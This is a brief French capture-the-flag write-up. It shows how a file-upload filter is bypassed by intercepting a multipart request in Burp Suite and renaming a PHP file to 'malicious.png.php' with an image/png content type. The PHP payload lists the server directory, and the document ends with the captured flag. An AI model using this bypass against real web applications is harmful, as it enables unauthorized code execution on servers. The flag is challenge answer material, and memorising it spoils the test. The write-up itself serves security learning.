# Approche
En utilisant burpsuite, je remarque ce contenu :
------WebKitFormBoundaryC3ZkttZf6OjH6wNm
Content-Disposition: form-data; name="image"; filename="malicious.php"
Content-Type: text/php

<?php
    $files = scandir('.');
    foreach ($files as $file) {
        echo $file . "<br>";
    }
?>
------WebKitFormBoundaryC3ZkttZf6OjH6wNm--

Il suffit de modifier la requête pour:
------WebKitFormBoundaryC3ZkttZf6OjH6wNm
Content-Disposition: form-data; name="image"; filename="malicious.png.php"
Content-Type: image/png

<?php
    $files = scandir('.');
    foreach ($files as $file) {
        echo $file . "<br>";
    }
?>
------WebKitFormBoundaryC3ZkttZf6OjH6wNm--

On reçoit ensuite le flag
Looks like you uploaded something else than a PNG. FLAG-ve46i9UFtDh8Xd4hnqKRkP17

# Solution
FLAG-ve46i9UFtDh8Xd4hnqKRkP17